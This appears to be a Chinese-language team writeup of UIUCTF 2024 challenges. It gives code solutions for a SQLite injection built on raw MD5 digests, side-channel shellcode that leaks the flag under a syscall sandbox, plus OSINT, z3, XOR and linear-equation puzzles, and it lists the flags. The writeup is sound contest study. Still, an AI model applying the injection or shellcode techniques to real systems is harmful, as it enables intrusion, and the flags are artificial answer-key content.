---
title: UIUCTF 2024 Writeup - 狼组
contest: UIUCTF
year: 2024
team: 狼组安全社区
difficulty: medium
vuln_type: web_unknown
tags: [md5-injection, sqlite-binary-where, syscall-sandbox, format-string-shellcode, osint, simple-xor-cipher, matrix-solver]
attack_chain:
- Fare Evasion (Web): SQLite 注入 + MD5 binary 注入
- "todo: convert md5 to hex string instead of latin1" → 爆破 5/6 字符的 MD5
- 让 MD5 字节序列 latin1 中包含 'or' 闭合 SQL
- 'or 1; → '=0-- → 爆破 xdax82'or'1+xd7Vpx1bwxd7.xb6
- Syscalls (Pwn): shellcode 限制 - 只能用 openat+mmap 不能 write
- 侧信道爆破 flag 字符 - mov dl, [rdi+pos]; cmp cl, char; jz loop; mov al, 60 (exit)
- 按位爆破 uiuctf{a53aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
- OSINT 系列 (3 题): LISA 地铁局 + Instagram + Google Maps
- Night: Massachusetts Ave Bridge, Boston → Arlington Street, Boston
- New Dallas: 经纬度坐标铁路交叉点
- Summarize (Reverse): 6 个 9 位数 z3 求解
- Goose Chase: 200MB dump + WinDbg !analyze -v
- X Marked the Spot: 7 字节 XOR 已知 uiuctf{ 解首尾
- Without a Trace: 5 元 1 次方程 sympy.solve
- Determined: 矩阵推理 (Artin 引用)
key_payload: SQL: 'or 1; (MD5 bytes 形式)
one_liner: UIUCTF 2024 狼组：MD5 binary SQL 注入 + syscall sandbox 盲注 + z3 矩阵 + OSINT 系列。
lesson: MD5 输出是 16 字节二进制而非 16 进制；用 latin1 转换可含 'or' SQL 注入字符。
quality: high
---
# UIUCTF 2024 Writeup (狼组)

## Web - Fare Evasion
```javascript
// 注释暗示 md5 输出是 latin1 字节而非 hex
// todo: convert md5 to hex string instead of latin1??
const r = await fetch("/pay", { method: "POST" });
const j = await r.json();
document.getElementById("alert").innerText = j["message"];
```

### 攻击
- SQL: `SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`
- 爆破 5/6 字符的 MD5 让其 latin1 字节含 SQL 注入
```python
import hashlib
import string
str_list = list(string.ascii_letters)

for i in range(len(str_list)):
    for j in range(len(str_list)):
        for k in range(len(str_list)):
            for l in range(len(str_list)):
                for m in range(len(str_list)):
                    for z in range(len(str_list)):
                        tmp = str_list[i]+str_list[j]+str_list[k]+str_list[l]+str_list[m]+str_list[z]
                        str_hash = hashlib.md5(tmp.encode('utf-8')).digest()
                        if ("'or'" in str(str_hash)[2:-1] or "'=0--" in str(str_hash)[2:-1] ...):
                            print(tmp)
```
- 输出 `xdax82'or'1+xd7Vpx1bwxd7.xb6` (headerKid 值)

## Pwn - Syscalls (侧信道盲注)
- shellcode 限制 - 只能用 openat + mmap，不能 write
- 侧信道爆破每字节
```python
loop = b"\x8A\x5F" + p8(dis) + b"\xB1" + p8(char) + b"\x38\xD9\x74\x07\xB8\x3C\x00\x00\x00\x0F\x05\xEB\xFE"
# cmp dl, [rdi+pos]
# cmp cl, char
# jz loop (exit 0 if match)
# mov al, 60 (exit 60 if not match)
```
- `uiuctf{a53aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}`

## OSINT
- **Night**: Massachusetts Ave Bridge, Boston → `uiuctf{Arlington Street, Boston}`
- **New Dallas**: 经纬度铁路交叉点 (3 位小数 + 末位奇偶)
- **LISA**: Instagram OSINT 找合作伙伴

## Reverse
- **Summarize**: 6 个 9 位数 + 8 个 mod 关系
```python
import z3
a = [z3.BitVec(f'a{i}', 32) for i in range(6)]
x = z3.Solver()
for i in range(6):
    x.add(a[i] > 100000000); x.add(a[i] <= 999999999)
# ... 8 个 mod 等式
# 输出: 705965527 780663452 341222189 465893239 966221407 217433792
# uiuctf{2a142dd72e87fa9c1456a32d1bc4f77739975e5fcf5c6c0}
```

- **Goose Chase**: 200MB dump + WinDbg `!analyze -v` 找线索

## Crypto
- **X Marked the Spot**: XOR
```python
key1 = bytes_to_long(data[:7]) ^ bytes_to_long(b"uiuctf{")
key2 = data[-1] ^ ord(b"}")
key = long_to_bytes(key1) + long_to_bytes(key2)
for i, j in zip(data, cycle(key)):
    print(chr(i ^ j), end="")
```

- **Without a Trace**: 5 元一次方程
```python
x1, x2, x3, x4, x5 = symbols("x1 x2 x3 x4 x5")
q1 = Eq(3*x1+x2+x3+x4+x5, 3008689050337)
# ... 5 个方程
res = solve([q1, q2, q3, q4, q5])
```

- **Determined**: "Matrices can be shortened by 50% if you throw the matrices out" - Artin 引用 (其实是线性代数证明)
